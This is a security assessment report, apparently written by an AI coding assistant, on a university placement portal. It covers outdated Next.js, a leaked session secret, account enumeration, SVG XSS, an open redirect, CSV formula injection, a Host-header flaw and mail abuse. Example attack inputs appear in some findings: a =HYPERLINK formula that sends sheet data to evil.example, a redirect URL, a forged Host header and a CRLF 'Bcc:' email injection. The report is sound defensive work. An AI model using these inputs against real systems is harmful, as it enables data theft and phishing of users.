# Security Assessment — IIT (ISM) CDC Placement Portal
2026-10-01 · Assessor: Claude Code (white-box, local instance) · Commit: `7bcff0a` + uncommitted working tree (Phase 2 M2–M10 and QA Part 10 fixes) · Scope: `CDC/backend`, `CDC/frontend`

Confidence labels on every finding:
- **CONFIRMED-LIVE**: proven on the running local app or by an executed test.
- **CONFIRMED-CODE**: certain from the code and configuration (`file:line`).
- **LIKELY**: the code is clear, but whether it can be exploited depends on runtime or deployment behaviour that wasn't exercised. Each LIKELY item names the regression test that will settle it in the remediation phase.

---

## 1. Executive Summary

- **Overall risk rating: HIGH.** No issue gives an outsider control of the portal on its own. The highest risk is an un-upgraded web framework with published critical advisories (SEC-001).
- **In plain words:** the part of the portal that decides who may see what is strong.
  - Across 1,396 automated requests and a set of manual checks, no student could see another student's data, no company could see another company's applicants, and no student or company could reach admin functions.
  - Companies receive exactly the applicant fields CDC agreed to share.
- **The main issues:**
  - The website framework (Next.js) and its login library have published security fixes that haven't been installed.
  - The key that protects login sessions on the website is saved in the project's history and is still the one in use.
  - Several medium issues let an outsider confirm which accounts exist, abuse the portal to send emails, or redirect a user to a fake site after a genuine login.
- **Counts:** Critical **0** · High **1** · Medium **10** · Low **11** · Info **13**.
- **Top 5 risks:**
  1. **SEC-001**: Next.js 16.2.1 has known critical advisories (request-filter bypasses, remote code execution in the image optimiser).
  2. **SEC-002**: the NextAuth session secret is in the repository history and still in use, so anyone with a copy of the code could decrypt or forge website session cookies.
  3. **SEC-004**: a company can upload an SVG "logo" containing script, which runs when someone opens the file's link directly.
  4. **SEC-003/SEC-008**: an outsider can confirm which accounts exist, guess passwords across many accounts, and lock any user out for a minute at a time.
  5. **SEC-005**: after a genuine login, a crafted link can send the user on to a look-alike site.
- **Launch recommendation: SAFE AFTER FIXING SEC-001 and SEC-002** (SEC-002: owner rotation in progress). SEC-003 to SEC-011 should follow within two weeks of launch, before the first full placement season.

---

## 2. Scope, Method & Limitations

**Scope:** the Laravel 12 API (167 `api/*` routes, plus the welcome page, `/up`, `/sanctum/csrf-cookie` and Laravel's signed `/storage/{path}` routes), the Next.js 16 frontend (NextAuth handler, `/api/proxy-pdf`, `proxy.ts` and every page), local MySQL 9.6, the private and public storage disks, and the database queue.

**Rules followed:**
- Local only: `http://localhost:3000`, `http://127.0.0.1:8000`, local MySQL.
- Every artisan and queue command ran with `MAIL_MAILER=log`, and the running server process uses the log mailer. `backend/.env` itself still names a real SMTP server and was left untouched.
- Only QA and demo accounts on `.qa.test` / `.cdc-demo.test` domains were used. The seeded `admin@iitism.ac.in` account was never logged into.
- Secrets are redacted to their first and last two characters.
- No application code was changed.

**Method:**
1. Recon: an automated route inventory and data inventory (`security/attack_surface.md`).
2. Secret scans of the working tree and the full git history (`security/secret_scan.py`, gitleaks-style patterns).
3. `composer audit` and `npm audit` (the only outbound requests).
4. Live authentication tests (Part 3) and live IDOR probes (Part 5.2).
5. Automated PHPUnit security tests in `backend/tests/Feature/Security/`:
   - `AuthenticationTest`: 12 tests, 8 pass, 4 fail (findings).
   - `SessionTokenTest`: 6 tests, 5 pass, 1 fails (finding).
   - `AuthorizationMatrixTest`: 1,396 requests; only the known Phase 1 anomalies remain.
   - `MassAssignmentAndLogicTest`: 6 of 6 pass.
6. Two independent static code reviews (injection/XSS sinks; authorisation/mass assignment), each claim then verified against the code by me.
7. Ordinary requests for headers and cookies.

**Tools and versions:** PHP 8.5.5, Composer 2.9.7, Node 24.14.1, npm 11.11.0, PHPUnit via `php artisan test`, curl, Chrome (Playwright channel). gitleaks, semgrep, OWASP ZAP, trivy and docker are **not installed** and nothing was downloaded, so those checks were done by hand.

### What was NOT tested and why
- **Signed-link edge cases** (alternative path spellings and encodings of signed resume URLs). Dropped by owner direction during Part 4. The ordinary tamper cases (ID swap, extended expiry, missing signature, expired link) were tested and pass. The remaining edge behaviour is covered by QA tests T2.7 and T8.1a. Related dependency advisory: SEC-011.
- **Live injection probing.** Replaced by code review by owner direction in Part 6, after about 80 initial search and filter probes, which produced no SQL errors and no delays. XSS, CSV/formula, header injection, XXE, path traversal, deserialisation and template injection were all decided from the code (`file:line`). Items whose exploitation would need a runtime check are labelled LIKELY.
- **Production infrastructure:** TLS, reverse proxy, real Host-header handling, MySQL grants, PHP-FPM hardening and backups. No deployment config exists in the repository; see the §10 checklist.
- **Real SMTP delivery** and SPF/DKIM/DMARC: log mailer only.
- **Scanner-based coverage** (ZAP baseline, semgrep rules): the tools aren't installed.
- **Denial of service:** reasoned from the code only, never load-tested.

---

## 3. Attack Surface Summary

Full detail: [`security/attack_surface.md`](security/attack_surface.md) · route table: [`security/evidence/routes.md`](security/evidence/routes.md) · schema: [`security/evidence/db_columns.txt`](security/evidence/db_columns.txt).

**Routes:** 167 `api/*` routes.
- 9 public.
- 158 authenticated: 102 admin, 30 company, 20 student, 6 any role.
- Every authenticated route has `auth:sanctum` + `active` + exactly one role.

**Non-API routes:** `GET` and `PUT /storage/{path}` (signed; the private disk has `serve => true`), `/up` and `/`.

**Personal data:** 2,892 student profiles. These hold contact details, CGPA, backlogs, 10th/12th marks, date of birth, category, PwD status, home state, photos and resumes, plus offers with CTC and blocks with debarment remarks. The student owns their record. Admins see everything. Companies see applicants of their own postings only: Q10.2 fields, plus contacts only if `share_contact_details` is on.

**File entry points:**

| Upload | Disk | Notes |
|---|---|---|
| Company logo (public registration, company profile) | **public** | SVG allowed |
| Company form attachment (dead route, still live) | **public** | |
| Policy PDF | **public** | |
| Resume | **private** | |
| Student photo | **private** | |
| Spreadsheet imports (students, academics, enrolment, round results) | not stored | admin only |

**Outbound connections:** SMTP and the database queue. The backend makes no outbound HTTP calls. The Next.js server calls Laravel to log users in and to fetch PDFs through `proxy-pdf`. Browsers load the pdf.js worker from unpkg.

**Top abuse cases prioritised:**
1. Committed secrets (session-signing key, `APP_KEY`).
2. Stored XSS that steals the bearer token exposed to page JavaScript.
3. A student reading another student's data.
4. A company reading a competitor's data.
5. Forged signed URLs.
6. Mass assignment.
7. Function-level authorisation gaps.
8. Malicious uploads.
9. Credential stuffing, or locking users out through the one shared login IP.
10. Over-fetching of personal data and applicant counts.

**Outcome:** cases 3, 4, 6, 7 and 10 are closed (§5, §8). Case 1 is SEC-002 (and SEC-023 for `APP_KEY`). Cases 2 and 8 are SEC-004/SEC-009. Case 9 is SEC-003/SEC-008. Case 5 depends on `APP_KEY` secrecy (SEC-023).

---

## 4. Findings (sorted by severity, then CVSS)

### SEC-001 · [High] Next.js 16.2.1 and next-auth 5.0.0-beta.30 carry critical published advisories
| Field | Value |
|---|---|
| CVSS v3.1 | 8.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H), working estimate. The advisories themselves are rated Critical/High. |
| CWE / OWASP | CWE-1104 Use of unmaintained/vulnerable components · A06 Vulnerable and Outdated Components |
| Affected | `frontend/package.json`: `next@16.2.1`, `next-auth@5.0.0-beta.30` (`@auth/core` ≤0.41.2) |
| Confidence | **CONFIRMED-CODE** for the vulnerable versions (`npm audit`, `security/evidence/npm_audit_frontend.json`); **LIKELY** for exploitability of individual advisories |
| Status | **Fixed** in P-1 (2026-10-10): §12 |

**Description:** `npm audit --omit=dev` lists 12 vulnerable packages (3 critical). For Next.js:
- several Middleware/Proxy bypasses (GHSA-492v-c6pp-mqqv, GHSA-267c-6grr-h53f, GHSA-26hh-7cqf-hhc6, GHSA-6gpp-xcg3-4w24);
- remote code execution in the Image Optimization API with AVIF (GHSA-2xp9-vwfh-vxw4). The app uses `next/image` in several pages with `images.remotePatterns` for the API origin;
- SSRF (GHSA-p9j2-gv94-2wf4, GHSA-c4j6-fc7j-m34r), plus DoS and cache-poisoning issues.

For next-auth/@auth/core:
- "configuration errors fail open" (GHSA-8fpg-xm3f-6cx3). This is already mitigated by the D17 fail-closed checks in `proxy.ts` and `app/api/proxy-pdf/route.ts`, which require `.user`.
- a malformed-bearer exception (GHSA-xmf8-cvqr-rfgj).

**Why this isn't Critical here:** `proxy.ts` is only a navigation gate (all data is enforced by Laravel), the app has no server actions, rewrites or `next/og`, and production is not Windows-hosted.

**Proof of concept:** `security/evidence/npm_audit_frontend.json`. No live exploitation was attempted.

**Impact:** at worst, code execution on the Next.js server (which holds `NEXTAUTH_SECRET`) or bypass of page gating. At least, denial of service.

**Remediation:** upgrade to `next@16.3.8` or later and the latest `next-auth` 5 release, then add `npm audit --omit=dev --audit-level=high` as a release gate. The unused `axios` (high advisory) should be removed: SEC-I05.

**Verification test:** CI gate on `npm audit --omit=dev --audit-level=high`, plus the existing `tests/e2e/student-portal.spec.js` smoke run on the upgraded version.

### SEC-002 · [Medium] NextAuth secret in git history is the one still in use
| Field | Value |
|---|---|
| CVSS v3.1 | 6.8 (AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N) |
| CWE / OWASP | CWE-798, CWE-321 Hard-coded cryptographic key · A02 Cryptographic Failures, A07 |
| Affected | `SETUP_GUIDE.md` / `CDC/SETUP_GUIDE.md` in commit `238560d` (removed from HEAD) → `NEXTAUTH_SECRET=de…90` (38 chars, word-based); identical to `frontend/.env.local` |
| Confidence | **CONFIRMED-CODE** (equality check) |
| Status | **Open: owner rotation in progress** |

**Description:** Auth.js derives the key that encrypts and signs the session cookie from this secret. Anyone with the repository can:
- decrypt a captured session cookie, which contains the user's Sanctum API token;
- mint session cookies with any role. These pass `proxy.ts` and `/api/proxy-pdf`, although Laravel still requires a real API token.

**Impact:** session forgery at the Next.js layer, and recovery of a victim's API token from any leaked cookie (logs, proxies, shared machines).

**Remediation:** generate a new 32-byte random secret (`openssl rand -base64 32`) for each environment, keep it out of documentation, and treat rotation as invalidating all sessions.

**Verification test:** owner check that the secret differs from every committed value (`security/secret_scan.py history`), plus a unit check that `AUTH_SECRET` is at least 32 random bytes at startup.

### SEC-003 · [Medium] Account enumeration through login timing, the forgot-password throttle and registration endpoints
| Field | Value |
|---|---|
| CVSS v3.1 | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) |
| CWE / OWASP | CWE-204 Observable response discrepancy, CWE-208 Observable timing discrepancy · A07 · API2 |
| Affected | `AuthController::login` (bcrypt only for existing users); `AuthController::forgotPassword:114-121` (`RESET_THROTTLED` → distinct 429; 503 only on mail send); `CompanyAuthController:184,187` (`unique` → "The email has already been registered."); `GET /auth/company/recruiter-email/verification-status` (public) |
| Confidence | **CONFIRMED-LIVE** (timing and 429 oracle); **CONFIRMED-CODE** (registration messages) |
| Status | Open |

**Proof of concept:** `security/poc/A3_1_login_timing.py` → `security/evidence/A3_1_login_timing.txt`:
- unknown email 33 ms mean, known email with wrong password 275 ms (gap 242 ms, the ranges never overlap);
- the same for roll numbers;
- identical bodies throughout.

`security/evidence/A3_2_enumeration.txt`: a second forgot-password request for an existing account → `429 "Please wait before requesting another reset link."`, while unknown accounts always get 200. Tests `AuthenticationTest::test_A3_1…` and `::test_A3_2…` fail.

**Impact:** an attacker can confirm which admin and company emails and which roll numbers have accounts. This feeds credential stuffing and targeted phishing.

**Remediation:**
- Run a dummy `Hash::check` against a fixed hash when the user doesn't exist.
- Answer forgot-password with 200 whatever the throttle state, and throttle silently.
- Return the same response from the verification-link endpoint for registered and unregistered emails (mail the existing owner instead).
- Remove `verification-status` or require the verification token.

**Verification tests:** `AuthenticationTest::test_A3_1_failed_login_timing_does_not_reveal_whether_the_account_exists`, `::test_A3_2_forgot_password_responses_are_identical_for_existing_and_unknown_accounts`.

### SEC-004 · [Medium] SVG company logos can carry script and are served from the public disk on the API origin
| Field | Value |
|---|---|
| CVSS v3.1 | 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N) |
| CWE / OWASP | CWE-79 Stored XSS, CWE-434 Unrestricted upload of dangerous type · A03 Injection |
| Affected | `CompanyAuthController.php:40,81` and `CompanyProfileController.php:134,137`: `'company_logo' => ['required','file','mimes:jpg,jpeg,png,webp,svg','max:2048']` then `->store('company-logos', 'public')` |
| Confidence | **CONFIRMED-CODE**: SVG accepted, kept with its `.svg` extension, no sanitiser anywhere (`grep sanitiz` → 0), served as static files with no `X-Content-Type-Options`, CSP or `Content-Disposition` (`security/evidence/P8_headers.txt`). **LIKELY**: script execution when the file URL is opened directly (needs the server to send `image/svg+xml`). No SVG was uploaded during the audit. |
| Status | **Fixed in code** in P-1 (2026-10-10); `/storage` headers still to be set on the web server: §12 |

**Description:**
- In the app, logos only appear inside `<img>`/`<Avatar>`, where SVG script doesn't run.
- The file URL itself (`/storage/company-logos/<hash>.svg`) is on the API origin. Opened directly, an SVG document runs its script there.
- The PDF proxy no longer relays it onto the frontend origin (D59).

**Impact:** limited in today's build, because the API origin holds no cookies or tokens. It's still a phishing and defacement host on CDC's own domain, and it becomes token theft if the API and frontend are ever served from one origin.

**Remediation:** drop `svg` from both rules (or sanitise with a vetted SVG sanitiser after approval). Serve `/storage/*` with `X-Content-Type-Options: nosniff` and `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; sandbox`, through web-server config.

**Verification test (for the LIKELY part):** `tests/Feature/Security/UploadTest::test_company_logo_rejects_svg_and_scriptable_types` uploads an SVG containing `<script>` and expects 422 or a sanitised file. A header check on `/storage/company-logos/*` expects `nosniff` and a CSP.

### SEC-005 · [Medium] Open redirect after login through `callbackUrl`
| Field | Value |
|---|---|
| CVSS v3.1 | 4.7 (AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N) |
| CWE / OWASP | CWE-601 Open redirect · A01 Broken Access Control |
| Affected | `frontend/app/auth/login/[type]/page.tsx:143` (`const callbackUrl = searchParams.get("callbackUrl") \|\| ""`) and `:195,200,204` (`router.replace(callbackUrl \|\| "/admin")` etc.); `frontend/app/auth/login/page.tsx:12-19` forwards the whole query string |
| Confidence | **CONFIRMED-CODE**: no check that the value is a same-origin relative path. **LIKELY**: the router navigates to an absolute or protocol-relative URL (`https://…`, `//…`) after a successful login; not exercised live. |
| Status | **Fixed** in P-1 (2026-10-10): §12 |

**Description:**
- `proxy.ts` itself only ever sets `callbackUrl` to the internal pathname, which is safe.
- But anyone can craft `/auth/login/student?callbackUrl=https://evil.example/fake-portal`.
- `signIn` is called with `redirect: false`, so Auth.js's own same-origin redirect check never applies. The page navigates itself.

**Impact:** a genuine login on the real portal is followed by a jump to a look-alike page, which might ask the user to "re-enter the password" or download a "result sheet".

**Remediation:** accept `callbackUrl` only if it starts with a single `/` (not `//` or `/\`) and parses to the same origin. Otherwise fall back to the role home page. Put this in a shared helper used by both login pages.

**Verification test:** a unit test of the helper (rejects `https://evil.example`, `//evil.example`, `/\evil.example`, `javascript:…`; accepts `/student/postings`), plus a Playwright case in `tests/e2e/student-portal.spec.js`: logging in with `callbackUrl=https://evil.example` must land on `/student`.

### SEC-006 · [Medium] Formula injection in the Phase 1 JNF/INF CSV downloads
| Field | Value |
|---|---|
| CVSS v3.1 | 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N) |
| CWE / OWASP | CWE-1236 Improper neutralisation of formula elements in a CSV file · A03 Injection |
| Affected | `AdminFormReviewController::streamCsvDownload:1677-1692` (`fputcsv($output, $row)`); `csvValue:1694-1721` (returns `(string) $value` unchanged); rows built at `:364` (JNF) and `:535` (INF) from company-controlled values (company name, HR name, job title, `form_data` fields) |
| Confidence | **CONFIRMED-CODE**: nothing neutralises `=`, `+`, `-`, `@`, tab or carriage return |
| Status | **Fixed** in P-1 (2026-10-10): §12 |

**Description:** a company can submit form fields beginning with `=` (e.g. `=HYPERLINK("https://evil.example/?d="&B2,"Click to verify")`). An admin who downloads the CSV and opens it in Excel or Sheets gets a live formula. The Phase 2 Excel exports are **not** affected: `ExportService::put()` (`:231-244`) writes every string with `setCellValueExplicit(..., TYPE_STRING)` (D87).

**Impact:** data from the admin's sheet can leak through clickable links, plus spoofed content. Modern Excel warns before running DDE-style formulas.

**Remediation:** create one helper used by `csvValue()` (and any future CSV writer) that prefixes `'` to any value starting with `=`, `+`, `-`, `@`, `\t` or `\r`. Keep the Phase 1 column layout (Q8.3).

**Verification test:** `tests/Feature/Security/ExportInjectionTest::test_phase1_csv_neutralises_formula_prefixes` creates a JNF titled `=1+1` and a company named `@SUM(1)`, downloads the CSV as admin and asserts the cells start with `'`.

### SEC-007 · [Medium] Recruiter verification link is built from the request's Host header
| Field | Value |
|---|---|
| CVSS v3.1 | 5.8 (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N) |
| CWE / OWASP | CWE-644 Improper neutralisation of HTTP headers, CWE-640 Weak password-recovery mechanism (same pattern) · A07 |
| Affected | `CompanyAuthController.php:205` (`$apiOrigin = rtrim($request->getSchemeAndHttpHost(), '/')` used in the emailed link); no `trustHosts()` in `bootstrap/app.php` |
| Confidence | **CONFIRMED-CODE**: the link origin comes from the request. **LIKELY**: a forged Host header reaches Laravel in production (depends on the reverse proxy's default server block); not exercised live because the endpoint's `email:rfc,dns` rule would need external DNS. |
| Status | **Fixed** in P-1 (2026-10-10): §12 |

**Description:**
1. An attacker requests a verification link for `hr@victimcompany.com` with `Host: attacker.example`.
2. The genuine CDC email then points to the attacker's host.
3. If the recruiter clicks, the token goes to the attacker.
4. The attacker verifies the address and registers a company account under the victim's email, before the real recruiter does.

The password-reset link is **not** affected: it is built from `FRONTEND_URL` (`User.php:87-101`; tested in `AuthenticationTest::test_A3_5_reset_link_is_built_from_config_not_from_host_headers`).

**Impact:** impersonation of a recruiter or company in the portal (fake JNFs or INFs from a trusted company name).

**Remediation:** build the link from `config('app.url')` (or `FRONTEND_URL`) and enable Laravel's `trustHosts()` middleware with the production host list.

**Verification test:** `AuthenticationTest::test_A3_9_verification_link_uses_configured_origin`. It sends the request with `Host: evil.example` through a seam that bypasses the DNS part of the email rule in tests, and asserts the mailed URL starts with `config('app.url')`.

### SEC-008 · [Medium] Login throttling is easy to spray around and can lock out legitimate users
| Field | Value |
|---|---|
| CVSS v3.1 | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L) |
| CWE / OWASP | CWE-307 Improper restriction of excessive authentication attempts, CWE-645 Overly restrictive account lockout · A07 · API2 |
| Affected | `AppServiceProvider.php:41-53` (`api` 60/min per user or IP; `login` 10/min per account); `routes/api.php:45`; `frontend/auth.ts:37` (login request sent from the Next.js server) |
| Confidence | **CONFIRMED-LIVE** (spray and lockout); **CONFIRMED-CODE** (shared IP) |
| Status | **Fixed** in P-1 (2026-10-10); CAPTCHA not approved: §12 |

**Proof of concept** (`security/poc/A3_3_bruteforce.sh` → `security/evidence/A3_3_bruteforce.txt`):
- 50 wrong passwords against one QA student → 10×422 then 40×429. The **correct** password straight afterwards → 429, so the owner is locked out.
- One guess each against 50 different accounts from one IP → 50×422 with no throttling.

**Description:** NextAuth's `authorize()` calls `POST /api/auth/login` from the Next.js server. In production every login therefore shares one source IP, so the 60/min `api` bucket becomes a **portal-wide** login budget. Anyone sending 60 bad logins a minute can stall everybody's sign-in (QA N-1).

**Remediation:**
1. Forward the real client IP from Next.js to Laravel with a shared secret header, and trust only that.
2. Key the IP limit on the forwarded IP.
3. Add a per-account limit that slows down (exponential backoff) rather than fully blocking the owner, and a CAPTCHA after N failures (owner approval needed for a new dependency).
4. Log failed logins (SEC-I08).

**Verification test:** `tests/Feature/Security/LoginThrottleTest`. A spray across 50 accounts from one client IP must hit 429. A victim must still be able to log in, possibly after a CAPTCHA, while an attacker hammers the account from a different forwarded IP.

### SEC-009 · [Medium] API bearer token is readable by page JavaScript and the frontend has no Content-Security-Policy
| Field | Value |
|---|---|
| CVSS v3.1 | 4.2 (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N) |
| CWE / OWASP | CWE-522 Insufficiently protected credentials, CWE-1021/693 Missing protection mechanism · A05 |
| Affected | `frontend/auth.ts:98-107` (`session.accessToken = token.accessToken`); `GET /api/auth/session`; `frontend/next.config.ts:4-25` (no CSP) |
| Confidence | **CONFIRMED-LIVE**: `/api/auth/session` returned `accessToken` (Sanctum `id\|token`) to a logged-in student (`security/evidence/T4_3_T4_4_session.txt`); the frontend responses carry no CSP header (`security/evidence/P8_headers.txt`) |
| Status | **Partly fixed** in P-1 (2026-10-10): baseline CSP in place; token handling unchanged (Phase 1 A6, by design): §12 |

**Description:** no XSS sink reachable by attacker data was found. React escapes all stored text; the only `dangerouslySetInnerHTML` is Emotion CSS (`app/themeregistry.tsx:52`). But there's no second line of defence: any future XSS would read a 7-day API token with a single `fetch('/api/auth/session')`.

**Remediation:**
- Add a CSP in `next.config.ts` (`default-src 'self'; script-src 'self'; connect-src 'self' <API origin>; img-src 'self' data: <API origin>; frame-ancestors 'self'; object-src 'none'`, with nonces if needed).
- Bundle the pdf.js worker locally (SEC-018).
- Longer term, keep the token server-side and make API calls through a Next route handler, so JavaScript never sees it.

**Verification test:** a header assertion in `tests/e2e/student-portal.spec.js` that every page has a `Content-Security-Policy` without `unsafe-eval`.

### SEC-010 · [Medium] Unauthenticated endpoints send email to any address with no per-recipient cooldown
| Field | Value |
|---|---|
| CVSS v3.1 | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N) |
| CWE / OWASP | CWE-799 Improper control of interaction frequency, CWE-770 · A04 Insecure Design · API4 Unrestricted Resource Consumption |
| Affected | `AlumniOutreachController.php:75` (`Mail::to($submission->email)->send(...)` for any submitted address); `CompanyAuthController::sendRecruiterEmailVerificationLink:183-215` (`updateOrCreate` and send on every request, no cooldown); both behind only `throttle:api` (60/min per IP) |
| Confidence | **CONFIRMED-CODE** |
| Status | **Fixed** in P-1 (2026-10-10) for the per-recipient cooldown; per-IP caps and CAPTCHA not approved: §12 |

**Impact:**
- Each IP can make the portal send about 60 emails a minute to arbitrary people. That harasses third parties and burns the sending quota.
- It can get the CDC domain blacklisted, which would stop real invitations and results reaching students.

**Remediation:** per-recipient cooldown (e.g. one mail per address per 10 minutes) plus a per-IP daily cap on both endpoints; a CAPTCHA on the public alumni form (approval needed); drop the alumni confirmation mail or send it only after a click.

**Verification test:** `tests/Feature/Security/MailAbuseTest`. Five verification-link requests for one address within 10 minutes must send exactly one mail. Alumni confirmations to one address must be capped.

### SEC-011 · [Medium] Laravel and Symfony advisories on email validation and temporary signed URLs
| Field | Value |
|---|---|
| CVSS v3.1 | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N), estimate |
| CWE / OWASP | CWE-1104, CWE-93 CRLF injection · A06 |
| Affected | `laravel/framework` v12.56.0: "CRLF injection in default email rule" (High) and "Temporary Signed URL Path Confusion" (Medium). `symfony/mime` v7.4.7: CVE-2026-45067 "Email Header / SMTP Command Injection via CRLF in Address" (High). (`security/evidence/composer_audit.txt`, 41 advisories in total.) |
| Confidence | **CONFIRMED-CODE** for the vulnerable versions; **LIKELY** for applicability |
| Status | **Fixed** in P-1 (2026-10-10): §12 |

**Why this applies:** public endpoints validate user-supplied addresses with the default `email` rule (forgot-password, alumni outreach) and then mail them. Resume links and the private-disk `/storage/{path}` route rely on temporary signed URLs.

Most of the rest (guzzle, psr7, commonmark, yaml) is not reachable: the backend makes no outbound HTTP calls and uses no markdown or YAML parsing of user input.

**Remediation:** `composer update laravel/framework symfony/mime symfony/mailer` to fixed releases, and add `composer audit` as a release gate.

**Verification test:** a CI gate on `composer audit --locked`, plus `tests/Feature/Security/HeaderInjectionTest::test_email_with_crlf_is_rejected_by_public_forms`, which posts an address containing `\r\nBcc:` to forgot-password and alumni outreach and expects 422 with no mail queued.

### SEC-012 · [Low] Password policy accepts common and personal passwords
| Field | Value |
|---|---|
| CVSS v3.1 | 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) |
| CWE / OWASP | CWE-521 · A07 |
| Affected | `AuthController::resetPassword` and `CompanyAuthController` register (`Password::min(8)->letters()->mixedCase()->numbers()`, no `uncompromised()`, no personal-data check) |
| Confidence | **CONFIRMED-LIVE**: `AuthenticationTest::test_A3_4_common_or_personal_passwords_are_rejected` fails; `Password1`, `Welcome123`, `<Name>1` and `<roll>pass` are all accepted |
| Status | Open |

**Remediation:** add `->uncompromised()` (it calls HIBP's k-anonymity API, so it needs owner approval for an outbound call) or a local top-10k blocklist, and reject passwords containing the user's name, roll number or email local part.

**Verification test:** `AuthenticationTest::test_A3_4_common_or_personal_passwords_are_rejected`.

### SEC-013 · [Low] Signed resume links are 30-day bearer credentials not tied to the application
| Field | Value |
|---|---|
| CVSS v3.1 | 3.1 (AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N) |
| CWE / OWASP | CWE-613 Insufficient session expiration, CWE-639 · A01 |
| Affected | `Resume.php:88-91` (`signedUrl(int $days = 30)`), used in the company applicant list and every export; `AdminResumeController::signed` |
| Confidence | **CONFIRMED-LIVE**: `SessionTokenTest::test_T4_8_resume_link_handed_to_a_company_dies_when_the_application_is_withdrawn` fails (the link still works after withdrawal). ID swap, extension, missing signature and expiry all give 403 (pass). |
| Status | Open |

**Impact:** a forwarded export lets anyone open the listed resumes for 30 days. A company keeps access after the student withdraws.

**Remediation:**
- Shorten export links (e.g. 7 days).
- Add the application ID to the signed parameters and refuse when that application isn't live.
- Optionally issue per-company links.

**Verification test:** `SessionTokenTest::test_T4_8_resume_link_handed_to_a_company_dies_when_the_application_is_withdrawn`.

### SEC-014 · [Low] Recruiter verification link is reusable until it expires
| Field | Value |
|---|---|
| CVSS v3.1 | 3.1 (AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N) |
| CWE / OWASP | CWE-294 Authentication bypass by capture-replay · A07 |
| Affected | `CompanyAuthController::verifyRecruiterEmail:250-291` (re-renders success; the row is only consumed at registration) |
| Confidence | **CONFIRMED-LIVE**: `AuthenticationTest::test_A3_9_verification_link_is_single_use` fails |
| Status | **Fixed** in P-1 (2026-10-10): §12 |

**Remediation:** mark the token consumed on first use (clear `token_hash` and keep `verified_at`), and extend the verified state independently of the link's lifetime (fixes Phase 1 B7 as well).

**Verification test:** `AuthenticationTest::test_A3_9_verification_link_is_single_use`.

### SEC-015 · [Low] Session lifetimes are inconsistent (NextAuth 30 days, API token 7 days)
| Field | Value |
|---|---|
| CVSS v3.1 | 2.6 (AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N) |
| CWE / OWASP | CWE-613 · A07 |
| Affected | `frontend/auth.ts:22-24` (no `maxAge`, so the default is 30 days); `backend/config/sanctum.php:50` (7 days) |
| Confidence | **CONFIRMED-LIVE**: the session cookie `Expires` is 30 days after login (`security/evidence/T4_3_T4_4_session.txt`) |
| Status | **Fixed** in P-1 (2026-10-10): §12 |

**Impact:** after 7 days the admin and company shells look signed in but every call fails. The student shell signs out on 401 (D99). A stolen session cookie keeps the user's identity data for 30 days.

**Remediation:** set `session.maxAge` to the token lifetime (or shorter), and sign out on 401 in the admin and company API helpers too.

**Verification test:** `SessionTokenTest::test_T4_5_frontend_session_does_not_outlive_api_token` (static config check), plus an e2e check of the 401 redirect.

### SEC-016 · [Low] API and `/storage` responses lack hardening headers and leak the PHP version
| Field | Value |
|---|---|
| CVSS v3.1 | 2.6 (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N) |
| CWE / OWASP | CWE-693, CWE-200, CWE-524 · A05 |
| Affected | every API response: `X-Powered-By: PHP/8.5.5`, `Cache-Control: no-cache, private` on personal-data JSON (not `no-store`), no `X-Content-Type-Options` or `X-Frame-Options`; `/storage/*` has none of them (`security/evidence/P8_headers.txt`); PHP `expose_php=On` |
| Confidence | **CONFIRMED-LIVE** |
| Status | **Fixed** in P-1 (2026-10-10) for responses Laravel sends; `expose_php`, `/storage` and HSTS are server settings: §12 |

**Remediation:** a global middleware adding `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` and `Referrer-Policy`; `Cache-Control: no-store` on authenticated JSON; `expose_php=Off`; HSTS at the reverse proxy.

**Verification test:** `tests/Feature/Security/HeadersTest::test_api_responses_carry_security_headers_and_no_store`.

### SEC-017 · [Low] CORS and environment defaults would be unsafe if copied to production
| Field | Value |
|---|---|
| CVSS v3.1 | 3.1 (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N) |
| CWE / OWASP | CWE-942 Permissive cross-domain policy, CWE-1188 Insecure default · A05 |
| Affected | `backend/config/cors.php`: always allows `http://127.0.0.1:3000` and `http://localhost:3000` with `supports_credentials => true`; `backend/.env.example`: `APP_ENV=local`, `LOG_LEVEL=debug`, `FRONTEND_URLS` containing LAN IP `172.22.78.215`; `frontend/next.config.ts` `allowedDevOrigins` with the same IP |
| Confidence | **CONFIRMED-CODE**. The allow-list is exact (no patterns, no reflection); a normal preflight from `http://localhost:3000` returns that origin with credentials. |
| Status | Open |

**Impact:** low today because the API uses bearer tokens, not cookies. Copied defaults would allow those origins and verbose logging in production.

**Remediation:** build CORS origins only from `FRONTEND_URL`/`FRONTEND_URLS` (no hard-coded localhost), and ship a separate production `.env` template.

**Verification test:** `HeadersTest::test_cors_allows_only_configured_frontend_origin` (with `FRONTEND_URL=https://portal.example`, a request from `http://localhost:3000` gets no `Access-Control-Allow-Origin`).

### SEC-018 · [Low] pdf.js worker loaded from a third-party CDN without integrity checking
| Field | Value |
|---|---|
| CVSS v3.1 | 3.1 (AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N) |
| CWE / OWASP | CWE-829 Inclusion of functionality from an untrusted control sphere · A08 Software and Data Integrity Failures |
| Affected | `frontend/components/forms/shared/pdfviewer.tsx:12` (`workerSrc = //unpkg.com/pdfjs-dist@${version}/build/pdf.worker.min.mjs`) |
| Confidence | **CONFIRMED-CODE** |
| Status | **Fixed** in P-1 (2026-10-10): §12 |

